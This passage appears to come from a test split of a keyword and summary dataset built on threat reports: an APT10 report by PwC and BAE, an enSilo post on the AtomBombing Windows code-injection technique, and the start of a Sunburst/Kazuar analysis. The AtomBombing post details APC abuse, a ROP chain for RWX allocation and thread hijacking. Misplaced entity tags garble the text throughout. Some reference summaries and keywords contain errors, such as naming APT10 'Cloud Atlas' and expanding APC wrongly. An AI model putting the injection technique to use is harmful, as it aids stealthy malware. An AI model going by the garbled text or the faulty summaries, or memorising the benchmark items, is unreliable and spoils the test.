APT10 attacks on [NORP] Japanese academics . Includes info on [PERSON] ChChes ( technical ) , Poison Ivy and PlugX.\u2022 [ORG] NetEaseX and [PRODUCT] the [PRODUCT] Secret [PRODUCT] Key [PRODUCT] to [PRODUCT] Lisboa [PRODUCT] \u2013 CTO [PRODUCT] - TIB-\u2022 [PERSON] ChChes \u2013 Malware that [ORG] Communicates with C&C20170313 - 01A \u2013 BlackDLL\u2022 APT10 \u2019s .NET Foray \u2013 CTO - TIB-20170301 - 01B \u2013 Quasar\u2022 APT10 pauses for [EVENT] Chinese [EVENT] New [EVENT] Year , in Threats Underthe Spotlight \u2013 CTO - TUS-20170220 - 01A\u2022 CVNX \u2019s sting in the tail \u2013 CTO - TIB-20170123 - 01A \u2013 ChChes ( Scorpion ) Malware\u2022 [GPE] China and [GPE] Japan : [ORG] APT to dispute -CTO - SIB-20170119 - 01A\u2022 [ORG] Taiwan [ORG] Presidential Election : A Case Study onThematic Targeting , url security_updates/2016/03 / taiwant - election - targetting . html , published [DATE] 2016 [DATE] - 03 [DATE] - [DATE] 17 . Overview of [ORG] EvilGrab and it being used against [NORP] Asian targets , specifically around the [DATE] 2016 [NORP] Taiwanese [PERSON] election\u2022 [PERSON] Scanbox [PERSON] II \u2013 CTO - TIB-20150223 - 01A\u2022 \u201c IST [WORK_OF_ART] - [WORK_OF_ART] Red [WORK_OF_ART] Apollo-002 \u2013 [ORG] Red [ORG] Apollo [ORG] Tearsheet \u201d [ORDINAL] Third party reports A number of organisations have also published related reporting , as follows:\u2022 [ORG] RedLeaves \u2013 Malware Based on Open Source RAT \u2013 url based-on-open-source-rat.html \u2013 Further technical reporting on [ORG] RedLeaves , revealing links to an open source RAT.\u2022 The relevance between the attacker group menuPassand malware ( Poison Ivy , PlugX , [PERSON] ChChes ) , https:// www.lac.co.jp/lacwatch/people/20170223_001224.html , published [DATE] 2017 [DATE] - 02 [DATE] - 23 . Links APT10 to [PERSON] ChChes , Poison Ivy and [ORG] PlugX.Servers [ORG] Using [ORG] Cookie [ORG] Headers , url jp/2017/02 / chches - malware--93d6.html , published [DATE] 2017 [DATE] - 02 [DATE] - [DATE] 15 . Technical overview of [PRODUCT] ChChes malware with IOCs.\u2022 PlugX TrendMicro \u201c tearsheet \u201d , url plugx , published [DATE] 2016 [DATE] - 09 [DATE] - 07 . Technical info and IOCs for PlugX.\u2022 [WORK_OF_ART] A [WORK_OF_ART] Detailed [WORK_OF_ART] Examination [WORK_OF_ART] of [WORK_OF_ART] the [WORK_OF_ART] Siesta [WORK_OF_ART] Campaign , url threat - research/2014/03 / a - detailed - examination - of - the- siesta-campaign.html , published [DATE] 2014 [DATE] - 03 [DATE] - [DATE] 12 . Provides a detailed analysis of activity dubbed the Siesta campaign.\u2022 POISON IVY : Assessing Damage and [ORG] ExtractingIntelligence , url fireeye - www / global / en / current - threats / pdfs / rpt - poison- ivy.pdf , published 2013 - 08 - 21 . Technical report on Poison Ivy and campaigns that have used it , including [ORG] menuPass.\u2022 [ORG] EvilGrab [ORG] Malware Family Used [WORK_OF_ART] In [WORK_OF_ART] Targeted [WORK_OF_ART] Attacks [WORK_OF_ART] InAsia , url intelligence / evilgrab - malware - family - used - in - targeted- attacks - in - asia/ , published 2013 - 09 - 18 . Technical overview of EvilGrab.\u2022 CrowdCasts Monthly : You Have an Adversary Problem , url [DATE] monthly - you - have - an - adversary - problem , published [CARDINAL] 2013 [CARDINAL] - [CARDINAL] 10 [CARDINAL] - [CARDINAL] 16 , a presentation on [NORP] Chinese actors including [ORG] APT , crime and hacktivist . Includes section on [NORP] Stone [NORP] Panda ( APT10).\u2022 PlugX : [ORG] New [ORG] Tool [ORG] For [ORG] a [ORG] Not [ORG] So [ORG] New [ORG] Campaign , url plugx - new - tool - for - a - not - so - new - campaign/ , published [DATE] 2012 [DATE] - 09 [DATE] - [DATE] 10 . Gives an introduction to PlugX.\u2022 Pulling the Plug on PlugX , url com / vinfo / us / threat - encyclopedia / web - attack/112/ pulling - the - plug - on - plugx , published [DATE] 2012 [DATE] - 08 [DATE] - 04 . Gives a technical overview of PlugX and what it is used for.23About PwC At PwC , our purpose is to build trust in society and solve important problems . We \u2019re a network of firms in [CARDINAL] 157 countries with [CARDINAL] more [CARDINAL] than [CARDINAL] 223,000 people who are committed to delivering quality in assurance , advisory and tax services . PwC [GPE] UK \u2019s cyber security team is a part of this mission , helping clients around the world to assess , build and manage their cyber security capabilities and to identify and respond to incidents through a range of services including threat intelligence , threat detection and incident response . We are [ORG] BAE [ORG] Systems At [ORG] BAE [ORG] Systems , we provide some of the world \u2019s most advanced technology defence , aerospace and security solutions . At [ORG] BAE [ORG] Systems [ORG] Applied [ORG] Intelligence , we help nations , governments and businesses around the world defend themselves against cybercrime , reduce their risk in the connected world , comply with regulation , and transform their operations . We do this using our unique set of solutions , systems , experience and processes \u2013 often collecting and analysing huge volumes of data . This publication has been prepared for general guidance on matters of interest only , and does not constitute professional advice . You should not act upon the information contained in this publication without obtaining specific professional advice . No representation or warranty ( express or implied ) is given as to the accuracy or completeness of the information contained in this publication , and , to the extent permitted by law , [ORG] PricewaterhouseCoopers [ORG] LLP , its members , employees and agents do not accept or assume any liability , responsibility or duty of care for any consequences of you or anyone else acting , or refraining to act , in reliance on the information contained in this publication or for any decision based on it . \u00a9 [CARDINAL] 2017 PricewaterhouseCoopers LLP . All rights reserved . In this document , \u201c PwC \u201d refers to the [GPE] UK member firm , and may sometimes refer to the [ORG] PwC network . Each member firm is a separate legal entity . Please see www.pwc.com/structure for further details.170328 - 155605 - GC - [GPE] UK", "generated_text": "research; PwC; UK; BAE Systems; a Chinese-based threat actor; Operation Cloud Hopper; managed IT service providers; MSPs; extensive access; sensitive data; the threat actor; late 2016; Operation Cloud Hopper; a sophisticated web; exfiltration routes; a complex web; exfiltration routes; multiple victim networks; PlugX malware; PlugX malware; PlugX plug-ins; 2014; 2016; custom tools; the Poison Ivy malware family; the threat actor; the use; bespoke malware; open-source tools; sophistication; the infrastructure; information; targets; the attacks; Japanese organizations; the report; tactics; a shift; sophistication.", "ref_text": "<START-1>The document analyzes the activities of a China-based cyberespionage group called Cloud Atlas or APT10. It examines two major campaigns conducted by APT10 in 2016-2017 - one targeting managed IT service providers (MSPs) globally, and one targeting organizations in Japan. The MSP campaign, dubbed Operation Cloud Hopper, allowed APT10 unprecedented potential access to MSP clients globally. By compromising MSPs, APT10 gained access to client networks to exfiltrate intellectual property and sensitive data undetected. The report details APT10's tactics, techniques and procedures, which have evolved since previous public exposure in 2013 led them to retool. These include use of dynamic DNS infrastructure, new custom malware like RedLeaves, and open source tools like QuasarRAT. Other key findings are that APT10's activities align with Chinese working hours and strategic priorities outlined in China's 5 year plans. The group's targeting of aviation, pharmaceuticals, manufacturing, managed services, etc. provides economic and competitive intelligence beneficial to Chinese interests. The level of access and data theft seen indicates APT10 has extensive resources and highly skilled operators. The report aims to uncover their latest campaigns, assess the threat they pose, and provide mitigation advice to potential targets. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4678362573099415, "gpt3/lexical/rouge_rouge2": 0.1411764705882353, "gpt3/lexical/rouge_rougeL": 0.21637426900584794, "gpt3/lexical/rouge_rougeLsum": 0.21637426900584794, "gpt3_generated_text": ["In late 2016, PwC UK and BAE Systems conducted research on a cyber espionage campaign conducted by a Chinese-based threat actor known as APT10. This campaign, called Operation Cloud Hopper, targeted managed IT service providers (MSPs), giving the threat actor extensive access to sensitive data from both the MSPs and their clients worldwide. Additionally, a number of Japanese organizations were directly targeted in a separate campaign by the same threat actor. The research identified several key findings, including the targeting of MSPs since 2014, the use of complex exfiltration routes across multiple victim networks, the use of custom tools and the PlugX malware, a shift towards bespoke malware and open-source tools, and the use of interconnected command and control infrastructure. APT10 primarily focuses on espionage activity, specifically targeting intellectual property and sensitive data. The report concludes that APT10 is highly sophisticated and poses a significant threat."]}, {"split_name": "test", "sample_id": "test_45", "prompt_text": "Extract the keywords: ( url ( url by enSilo ( url [PERSON] Liberman ( url [DATE] October 27 , [DATE] 2016 ( url 49 Comments ( url#comments)AtomBombing : Brand New Code Injection for Windows ( url techniques / atombombing - brand - new - code - injection - for- windows/)TL;DR Here \u2019s a new code injection technique , dubbed [ORG] AtomBombing , which exploits Windows atom tables and Async Procedure Calls ( [ORG] APC ) . Currently , this technique goes undetected by common security solutions that focus on preventing in\ufb01ltration . Code injection has been a strong weapon in the hacker \u2019s arsenal for [DATE] many [DATE] years . For background on code injection and its various uses in [ORG] APT type attack scenarios please take a look at : url ( url security - solutions)OverviewI started poking around to see how hard it would be for a threat actor to \ufb01nd a new method that security vendors are unaware of and bypasses most security products . It also needed to work on different processes rather than being tailored to \ufb01t a speci\ufb01c process . I would like to introduce you to [ORG] AtomBombing \u2013 a brand new code injection technique for Windows . AtomBombing works in [CARDINAL] three main stages:1 . Write - What - Where \u2013 Writing arbitrary data to arbitrary locations in the target process \u2019s address space . [CARDINAL] 2 . Execution \u2013 Hijacking a thread of the target process to execute the code written in stage [CARDINAL] 1.3 . Restoration \u2013 Cleaning up and restoring the execution of the thread hijacked in stage 2.AtomBombing Stage 1 : Write - What - WhereI stumbled onto a couple of rather interesting API calls : [PERSON] GlobalAddAtom ( url \u2013 Adds a character string to the global atom table and returns a unique value ( an atom ) identifying the string . GlobalGetAtomName ( url \u2013 [NORP] Retrieves a copy of the character string associated with the speci\ufb01ed global atom . By calling GlobalAddAtom one can store a null terminated buffer in the global atom table . This table is accessible from every other process on the system . The buffer can then be retrieved by calling GlobalGetAtomName . GlobalGetAtomName expects a pointer to an output buffer , so the caller chooses where the null terminated buffer will be stored . In theory , if I could add a buffer containing shellcode to the global atom table by calling GlobalAddAtom , and then somehow get the target process to call GlobalGetAtomName I could copy code from my process to the target process , without calling [PERSON] WriteProcessMemory . Calling GlobalAddAtom from my process is pretty straightforward , but how would I get the target process to call GlobalGetAtomName?By using Async Procedure Calls ( APC):QueueUserApc \u2013 adds a user - mode asynchronous procedure call ( [ORG] APC ) object to the [ORG] APC queue of the speci\ufb01ed thread . [ORG] DWORD [ORG] WINAPI [ORG] QueueUserAPC ( _ In _ PAPCFUNC pfnAPC , _ In _ HANDLE hThread , _ In _ ULONG_PTR dwData ) ; [ORG] QueueUserApc receives a pointer to an APCProc which is de\ufb01ned as follows : VOID CALLBACK APCProc ( _ In _ ULONG_PTR dwParam ) ; GlobalGetAtomName \u2019s prototype is : [ORG] UINT [ORG] WINAPI GlobalGetAtomName ( _ In _ [ORG] ATOM nAtom , _ Out _ [PERSON] LPTSTR [PERSON] lpBuffer , _ In _ int [ORG] nSize ) ; Since GlobalGetAtomName expects [CARDINAL] 3 parameters ( while APCProc is de\ufb01ned to expect [CARDINAL] only [CARDINAL] 1 parameter ) we ca n\u2019t use [ORG] QueueUserApc to get the target process to call GlobalGetAtomName . Let \u2019s take a look at the internals of [PRODUCT] QueueUserApc:(./AtomBombing _ [FAC] Brand [FAC] New [FAC] Code [FAC] Injection [FAC] for [FAC] Windows [FAC] - [FAC] Breaking [FAC] Malware_\ufb01les / Figure-0 - QueueUserApc - Internals.png ) Figure [CARDINAL] 1 : QueueUserApcAs you can see [ORG] QueueUserApc uses the undocumented NtQueueApcThread syscall in order to add the [ORG] APC to the target thread \u2019s [PERSON] APC queue . Interestingly enough NtQueueApcThread receives a pointer to a function that is to be called asynchronously in the target thread , but the function being passed is not the original APCProc function the caller passed to [ORG] QueueUserApc . Instead the function being passed is [GPE] ntdll!RtlDispatchAPC , and the original APCProc function passed to [ORG] QueueUserApc is passed as a parameter to ntdll!RtlDispatchAPC.Let \u2019s take a look at ntdll!RtlDispatchAPC:(./AtomBombing _ Brand New Code Injection for Windows - Breaking Malware_\ufb01les / Figure-1- RtlDispatchApc.png ) Figure [CARDINAL] 2 : [GPE] ntdll!RtlDispatchAPCIt starts by checking if the [CARDINAL] 3 parameter is valid , which means an [ORG] ActivationContext needs to be activated before dispatching the APC.rdIf an [ORG] ActivationContext needs to be activated:(./AtomBombing _ [EVENT] Brand [EVENT] New [EVENT] Code [EVENT] Injection for Windows - Breaking Malware_\ufb01les / Figure-2 - RtlDispatchApc-2.png ) Figure [CARDINAL] 3 : [NORP] ntdll!RtlDispatchAPC \u2013 RtlActivateActivationContextUnsafeFastThe function [NORP] ntdll!RtlDispatchAPC executes the following:1 . The passed [ORG] ActivationContext ( currently in [ORG] ESI ) will be activated by calling RtlActivateActivationContextUnsafeFast . [CARDINAL] 2 . The parameter to the original APCProc function ( i.e. the [ORDINAL] third parameter passed to [ORG] QueueUserApc ) is pushed onto the stack . This is because we are about to call theoriginal APCProc function.3 . Right before dispatching the [ORG] APC , a call to [ORG] CFG ( _ _ guard_check_icall_fptr ) is made to make sure the [ORG] APC target is a [ORG] CFG valid function . [CARDINAL] 4 . A call to the original APCProc is made , and that \u2019s it \u2013 the [GPE] APC has been dispatched . Once APCProc returns , the activation context is deactivated:(./AtomBombing _ Brand New Code Injection for Windows - Breaking Malware_\ufb01les / Figure-3 - RtlDispatchApc-3.png ) Figure [CARDINAL] 4 : ntdll!RtlDispatchAPC \u2013 RtlDeactivateActivationContextUnsafeFastIf , on the other hand , no activation context needs to be activated:(./AtomBombing _ [EVENT] Brand [EVENT] New [EVENT] Code [EVENT] Injection for Windows - Breaking Malware_\ufb01les / Figure-4- RtlDispatchApc-4.png ) Figure [CARDINAL] 5 : [NORP] ntdll!RtlDispatchAPC \u2013 no activation contextThe code skips all the activation context related stuff and simply dispatches the [PERSON] APC right away after calling CFG.What does all this mean ? When calling [ORG] QueueUserApc we are forced to pass an APCProc which expects [CARDINAL] one parameter . However , under the hood [ORG] QueueUserApc uses NtQueueApcThread to call [NORP] ntdll!RtlDispatchAPC which expects [CARDINAL] 3 parameters . What was our goal ? To call GlobalGetAtomName . How many parameters does it expect ? [CARDINAL] 3 . Can we do this ? Yes . How ? NtQueueApcThread!See main_ApcWriteProcessMemory ( url ( url Stage 2 : ExecutionObviously I could never hope to consistently \ufb01nd [ORG] RWX code caves in my target processes . I needed a way to consistently allocate [ORG] RWX memory in the target process without calling VirtualAllocEx within the context of the injecting process . Sadly , I could not \ufb01nd any such function that I could invoke via [ORG] APC and would allow me to allocate executable memory or change the protection \ufb02ags of already allocated memory . What do we have so far ? Write - what - where + a burning desire to get some executable memory . I thought long and hard how to get over this hurdle , and then it hit me . When DEP was invented , its creators thought , \u201c that \u2019s it , data is no longer executable , therefore no one will ever be able to exploit vulnerabilities again \u201d . Unfortunately , that was not the case ; a new exploitation technique was invented solely to bypass DEP : ROP \u2013 [ORG] Return [ORG] Oriented [ORG] Programming . How can we use [ORG] ROP to our advantage in order to execute our shellcode in the target process?We can copy our code to an RW code cave in the target process ( using the method described in stage [CARDINAL] 1 ) . Then use a meticulously crafted [ORG] ROP chain to allocate [ORG] RWX memory , copy the code from the RW code cave to the newly allocated [ORG] RWX memory , and \ufb01nally jump to the [ORG] RWX memory and execute it . Finding an RW code cave is not a big problem . For this proof of concept , I decided to use the unused space after the data section of kernelbase . See main_GetCodeCaveAddress ( url ( url The ROP Chain : Our [ORG] ROP chain needs to do [CARDINAL] 3 things:1 . Allocate [ORG] RWX memory [CARDINAL] 2 . Copy the shellcode from the RW code cave to the newly allocated [ORG] RWX memory [CARDINAL] 3 . Execute the newly allocated [ORG] RWX memoryROP Chain Step [CARDINAL] 1 : Allocating RWX Memory We would like to allocate some [ORG] RWX memory . The \ufb01rst function that comes to mind is [PRODUCT] VirtualAlloc \u2013 a very useful function that can be used to allocate [ORG] RWX memory . The only problem is that the function returns the newly allocated [ORG] RWX memory in [ORG] EAX which would make our [ORG] ROP chain complicated by having to \ufb01nd a way to pass the value [PRODUCT] VirtualAlloc stored in [ORG] EAX to the next function in the chain . A very neat trick can be employed in order to simplify our [ORG] ROP chain and make it more sophisticated . Instead of using [PRODUCT] VirtualAlloc , we can use ZwAllocateVirtualMemory , which returns the newly allocated [ORG] RWX memory as an output parameter . This way we can actually set up our stack so that ZwAllocateVirtualMemory stores the newly allocated memory further along the stack , effectively passing the address to the next function in the chain ( see [LAW] Table [LAW] 1).ROP [LAW] Chain [LAW] Step [LAW] 2 : [LAW] Copying [LAW] the [LAW] Shellcode The next function we need is a function that will copy memory from [CARDINAL] one buffer to another . [CARDINAL] Two options come to mind : memcpy and RtlMoveMemory . When creating this kind of [ORG] ROP chain one might be initially inclined to go with RtlMoveMemory because it uses the stdcall calling convention , meaning it will clean up the stack after itself . This is a special case though . We need to copy memory to an address ( placed on the stack by ZwAllocateVirtualMemory ) and then somehow this address needs to be called . If we used RtlMoveMemory , it will pop the address of the [ORG] RWX shellcode right off the stack upon its return . On the other hand , if we use memcpy , the \ufb01rst entry on the stack would be the return address of memcpy , followed by the destination parameter of memcpy ( i.e. the [ORG] RWX shellcode).ROP Chain Step [CARDINAL] 3 : Executing the newly allocated [ORG] RWX memory We have allocated [ORG] RWX memory and copied our shellcode to it . We are about to return from memcpy but the address of the [ORG] RWX shellcode on the stack is 4 bytes away from the return address . Therefore , all we have to do is add an extremely simple gadget to our [ORG] ROP chain . This simple gadget will execute the opcode \u201c ret \u201d . memcpy will return to this simple gadget which will \u201c ret \u201d right into our [ORG] RWX shellcode . See main_FindRetGadget ( url ( url those who have to see it to believe it : Set EIP to point to ZwAllocateVirtualMemory , and ESP to point to this [ORG] ROP chain : [PERSON] Address0x300000000x300000040x300000080x3000000C0x300000100x300000140x30000018Valuentdll!memcpy0xffffffff0x30000020NULL0x30000028MEM_COMMITPAGE_EXECUTE_READWRITE0x3000001CPOINTER_TO_SOME_RET_INSTRUCTION0x30000020NULLComment// [PERSON] Return address from [NORP] ZwAllocateVirtualMemory// [NORP] Pseudo handle to the current process// Where to store the allocated memory// [PERSON] Irrelevant// [PERSON] Pointer to the size of the needed memory// Commit and not reserve// [ORG] RWX// [ORG] Return [ORG] Address from memcpy , our extremely simple ret gadget.// Where the allocated memory will be saved and the destination parameter of memcpy . This will store the address of the [ORG] RWX shellcode . CODE_CAVE_ADDRESSSHELLCODE_SIZE// The RW code cave containing the shellcode to be copied// The size of the shellcode to be allocated0x300000240x30000028Table [CARDINAL] 1 : The whole [ORG] ROP chain . See main_BuildROPChain ( url ( url Invoking the ROP Chain But wait , APCs allow me to send [CARDINAL] 3 parameters . Obviously I need to store [CARDINAL] 11 parameters on the stack . Our best bet is to pivot the stack to some RW memory which will contain our [ORG] ROP chain ( e.g. the RW code cave in kernelbase).How could we pivot the stack?NTSYSAPI NTSTATUS NTAPI NtSetContextThread ( _ In _ HANDLE hThread , _ In _ const CONTEXT * lpContext ) ; This syscall will set the context ( register values ) of hThread to the values contained in [ORG] lpContext . If we can get the target process to call this syscall with an [ORG] lpContext that will set ESP to point to our [ORG] ROP chain and set [ORG] EIP to point to ZwAllocateVirtualMemory , then our [ORG] ROP chain will execute . The execution of the [ORG] ROP chain will eventually lead to the execution of our shellcode . How do we get the target process to make this call ? [PERSON] APC has been good to us so far , but this syscall expects [CARDINAL] 2 parameters and not [CARDINAL] 3 , so when it returns the stack will be corrupt , and the behavior will be unde\ufb01ned . That said , if we pass a handle to the current thread as hThread , then the function will never return . The reason is that once execution gets passed on to the kernel , the context of the thread will be set to the context speci\ufb01ed by [ORG] lpContext , and there will be no trace that NtSetContextThread was ever called . If everything works out as we hope , we will have successfully hijacked a thread and got it to execute our malicious shellcode . See main_ApcSetThreadContext ( url ( url Stage 3 : RestorationWe do have [CARDINAL] one problem , though . The thread that we hijacked had a purpose before we had hijacked it . If we do n\u2019t restore its execution , there is no telling what kind of effect we could have on the target process . How do we restore execution ? I \u2019d like to remind you that we are now in the context of an [GPE] APC . When the [GPE] APC function completes , somehow execution is restored safely . Let \u2019s look at the dispatching of APCs from the target process \u2019s point of view . It looks like the function in charge of dispatching APCs ( WaitForSingleObjectEx in this example ) is ntdll!KiUserApcDispatcher.(./AtomBombing _ [ORG] Brand [ORG] New [ORG] Code [ORG] Injection [ORG] for [ORG] Windows [ORG] - [ORG] Breaking [ORG] Malware_\ufb01les / Figure-5 [ORG] - KiUserApcDispatcher.png ) Figure [CARDINAL] 6 : [ORG] KiUserApcDispatcherWe can see [CARDINAL] 3 \u201c calls \u201d in this block of code . The \ufb01rst call is to [ORG] CFG , the next call is to [ORG] ECX ( which is the address of the [ORG] APC function ) , and \ufb01nally a call to the undocumented [PERSON] ZwContinue . [PERSON] ZwContinue expects to receive a pointer to a CONTEXT structure and resumes the execution . Actually the kernel will check if there are any more APCs in the thread \u2019s [PERSON] APC queue , and dispatch them before \ufb01nally resuming the thread \u2019s original execution , but we can ignore that . The CONTEXT structure being passed to [PERSON] ZwContinue is stored in [ORG] EDI before calling the [ORG] APC function ( stored in [ORG] ECX ) . We can save [ORG] EDI \u2019s value at the beginning of our shellcode , and call [PERSON] ZwContinue with EDI \u2019s original value at the end of the shellcode , thereby restoring execution safely . See AtomBombingShellcode ( url ( url have to make sure that the value of [ORG] EDI will not be overridden during the call to NtSetContextThread , since it modi\ufb01es the values of the registers . This can easily be accomplished by setting [ORG] ContextFlags ( member of the CONTEXT structure passed to NtSetContextThread ) to CONTEXT_CONTROL which means that only EBP , [ORG] EIP , SEGCS , [ORG] EFLAGS , ESP , and [ORG] SEGSS will be affected . As long as ( CONTEXT.ContextFlags|CONTEXT_INTEGER = = 0 ) we should be ok.(./AtomBombing _ Brand New Code Injection for Windows - Breaking Malware_\ufb01les / Figure-6 - Chrome.png)Figure [CARDINAL] 7 : AtomBombing chrome.exeAnd there you have it , we have injected code into chrome.exe . Our injected code spawned the classic calc.exe proving that it works . Let [GPE] \u2019s try to inject code into vlc.exe:(./AtomBombing _ Brand New Code Injection for Windows - Breaking Malware_\ufb01les / Figure-7 - VLC.png ) Figure [CARDINAL] 8 : AtomBombing vlc.exeThe complete implementation can be found on [PERSON] GitHub ( url It has been tested against [FAC] Windows [FAC] 10 x64 Build [DATE] 1511 ( [ORG] WOW ) and [PRODUCT] Windows [PRODUCT] 10 x86 Build [DATE] 10240 . Compile for \u201c release\u201d . Let \u2019s do the same with mspaint.exe:(./AtomBombing _ Brand New Code Injection for Windows - Breaking Malware_\ufb01les / Figure-8 - MSPaint.png ) Figure [CARDINAL] 9 : AtomBombing mspaint.exeOh no , it crashed . Final [ORG] StepsHow do we proceed from here ? I have worked it out and at this point , I \u2019d rather leave this as an exercise to the reader . As an initial hint , I suggest you take a look at my previous blog post ( url\ufb02ow - guard - exceptions/ ( url\ufb02ow - guard - exceptions/ ) ) . I \u2019m sure you \u2019ll also \ufb01nd creative ideas , that I myself have n\u2019t found , to handle this problem and I \u2019d be happy to start this discussion . You can use the comments below or catch me [PERSON] @tal_liberman ( url [PERSON] Through [PERSON] Twitter , I \u2019ll also release some tidbits throughout [DATE] the [DATE] week . At any rate , I will publish my solution [DATE] next [DATE] week . APPENDIX : Finding Alertable [ORG] ThreadsOne thing we have not yet mentioned is that [ORG] QueueUserApc only works on threads that are in an alertable state . How does a thread enter an alertable state?According to Microsoft:\u201c\u201d\u201dA thread can only do this by calling [CARDINAL] one of the following functions with the appropriate \ufb02ags : [PERSON] SleepEx [PERSON] MsgWaitForMultipleObjectsExWhen the thread enters an alertable state , the following events occur:1 . The kernel checks the thread \u2019s [PERSON] APC queue . If the queue contains callback function pointers , the kernel removes the pointer from the queue and sends it to thethread.2 . The thread executes the callback function . [CARDINAL] 3 . Steps 1 and 2 are repeated for each pointer remaining in the queue . [CARDINAL] 4 . When the queue is empty , the thread returns from the function that placed it in an alertable state.url ( url\u201c\u201d\u201dFor our technique to be effective the target process must have [CARDINAL] at [CARDINAL] least [CARDINAL] one thread that is in an alertable state , or will enter an alertable state at some point , otherwise our APCs will never actually execute . I\u2019ve checked various software , and I \u2019ve noticed that most of the programs I \u2019ve checked have [CARDINAL] at [CARDINAL] least [CARDINAL] one alertable thread . Examples : [ORG] Chrome.exe , [GPE] Iexplore.exe , [ORG] Skype.exe , VLC.exe , [PERSON] MsPaint.exe , [GPE] WmiPrvSE.exe , etc . So now we have to \ufb01nd an alertable thread in the target process . There are many ways of doing this . I chose to use a method that is trivial , works in most cases , and is easy to implement and explain . We\u2019ll create an event for each thread in the target process , then ask each thread to set its corresponding event . We \u2019ll wait on the event handles , until one is triggered . The thread whose corresponding event was triggered is an alertable thread . How can an event be set ? By calling SetEvent(HANDLE hEvent).How will we get the threads in the target process to call SetEvent ? [PERSON] APC of course . Since [ORG] SetEvent receives exactly one parameter we can use [ORG] QueueUserApc to call it . The actual details of the implementation can be found in main_FindAlertableThread ( url ( url [PERSON] Techniques ( url apc ( url atombombing ( url code injection ( url injection/ ) , research ( url windows ( url navigation\u2190 Elastic Boundaries \u2013 Elevating privileges by environment variables expansion ( url environment - variables - expansion/ ) AtomBombing CFG Protected Processes \u2192 ( url We were unable to load Disqus . If you are a moderator please see our troubleshooting guide . Search for : Search \u2026 [PERSON] Tomer [PERSON] Bitton , [ORG] VP [ORG] Research , enSiloSearchObsessed by malware , hostile code and extreme packers . Low - level researcher . Feel free to contact.(url", "generated_text": "AtomBombing; Windows; atom tables; Async Procedure Calls; APC; the target process; a buffer; the global atom table; the buffer; VBA; a pointer; the atom table; an output buffer; the target process; a pointer; the VBA; a pointer; the zero-day rule; the security product; the target process; a compromise; the process; IOC; the solution; the target process; the process; the code; the attacker; the process; the debugging; victims; The first stage.", "ref_text": "<START-1>This PDF document is about a new type of code injection technique called \"AtomBombing\" for Windows systems. The main idea behind this technique is to add shellcode to the global atom table of another process and then use APC (Automatic Procedure Call) to execute it. It works in 3 stages - writing arbitrary data to the target process, executing the code by hijacking a thread, and restoring the thread's execution. The global atom table is used to write shellcode to the target process. APCs invoke ROP chain to allocate RWX memory, copy shellcode, and execute it. The ROP chain pivots the stack to point to the parameters needed for functions like NtAllocateVirtualMemory and memcpy. Shellcode execution is achieved by ret instruction into allocated RWX memory containing shellcode. Original thread execution is restored by using context pointer and ZwContinue after shellcode finishes. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4350877192982457, "gpt3/lexical/rouge_rouge2": 0.1413427561837456, "gpt3/lexical/rouge_rougeL": 0.2807017543859649, "gpt3/lexical/rouge_rougeLsum": 0.2807017543859649, "gpt3_generated_text": ["This article introduces a new code injection technique called AtomBombing, which exploits Windows atom tables and Async Procedure Calls (APC). The technique goes undetected by common security solutions and works on different processes. The first stage involves writing arbitrary data to arbitrary locations in the target process's address space. The article discusses the use of GlobalAddAtom and GlobalGetAtomName API calls to store and retrieve a buffer in the global atom table, accessible from every other process on the system. It also explores the use of QueueUserApc to add a user-mode asynchronous procedure call object to the APC queue of the specified thread in the target process. The article provides a detailed analysis of the internals of QueueUserApc and NtQueueApcThread syscall. The article highlights the importance of understanding and mitigating the AtomBombing technique to prevent compromise and protect against APT type attack scenarios."]}, {"split_name": "test", "sample_id": "test_46", "prompt_text": "Extract the keywords: Sunburst backdoor \u2013 code overlaps with Kazuarsecurelist.com/sunburst-backdoor-kazuar/99981IntroductionOn [DATE] December 13 , [DATE] 2020 , [ORG] FireEye published a blog post detailing a supply chain attack leveraging Orion IT , an infrastructure monitoring and management platform by [ORG] SolarWinds . In parallel , Volexity published an article with their analysis of related attacks , attributed to an actor named \u201c [PERSON] Dark [PERSON] Halo \u201d . [ORG] FireEye did not link this activity to any known actor ; instead , they gave it an unknown , temporary moniker \u2013 \u201c UNC2452\u201d . This attack is remarkable from many points of view , including its stealthiness , precision targeting and the custom malware leveraged by the attackers , named \u201c Sunburst \u201d by [ORG] FireEye . In a previous blog , we dissected the method used by Sunburst to communicate with its [CARDINAL] C2 server and the protocol by which victims are upgraded for further exploitation . Similarly , many other security companies published their own analysis of the [ORDINAL] Sunburst backdoor , various operational details and how to defend against this attack . Yet , besides some media articles , no solid technical papers have been published that could potentially link it to previously known activity . While looking at the [ORDINAL] Sunburst backdoor , we discovered several features that overlap with a previously identified backdoor known as [ORG] Kazuar . [ORG] Kazuar is a .NET backdoor first reported by [GPE] Palo [GPE] Alto in [DATE] 2017 . [GPE] Palo [GPE] Alto tentatively linked [ORG] Kazuar to the [ORG] Turla [ORG] APT group , although no solid attribution link has been made public . Our own observations indeed confirm that [ORG] Kazuar was used together with other [GPE] Turla tools during multiple breaches in past years.1/14A number of unusual , shared features between [ORG] Sunburst and [ORG] Kazuar include the victim [ORG] UID generation algorithm , the sleeping algorithm and the extensive usage of the FNV-1a hash . We describe these similarities in detail below . For a summary of this analysis and FAQs , feel free to scroll down to \u201c Conclusions\u201c . We believe it \u2019s important that other researchers around the world investigate these similarities and attempt to discover more facts about [ORG] Kazuar and the origin of [ORG] Sunburst , the malware used in the [ORG] SolarWinds breach . If we consider past experience , looking back to the [ORG] WannaCry attack , in [DATE] the [DATE] early [DATE] days , there were very few facts linking them to the [ORG] Lazarus group . In time , more evidence appeared and allowed us , and others , to link them together with high confidence . Further research on this topic can be crucial in connecting the dots . More information about [PERSON] UNC2452 , [ORG] DarkHalo , [ORG] Sunburst and [ORG] Kazuar is available to customers of [ORG] the [ORG] Kaspersky [ORG] Intelligence [ORG] Reporting service . Contact : intelreports[at]kaspersky.comTechnical [PERSON] DetailsBackgroundWhile looking at the [ORDINAL] Sunburst backdoor , we discovered several features that overlap with a previously identified backdoor known as [ORG] Kazuar . [ORG] Kazuar is a .NET backdoor first reported by [GPE] Palo [GPE] Alto in [DATE] 2017 . Throughout [DATE] the [DATE] years , [ORG] Kazuar has been under constant development . Its developers have been regularly improving it , switching from [CARDINAL] one obfuscator to another , changing algorithms and updating features . We looked at all versions of [ORG] Kazuar since [DATE] 2015 , in order to better understand its development timeline . In the following sections , we look at some of the similarities between [ORG] Kazuar and [ORG] Sunburst . [ORDINAL] First , we will discuss how a particular feature is used in [GPE] 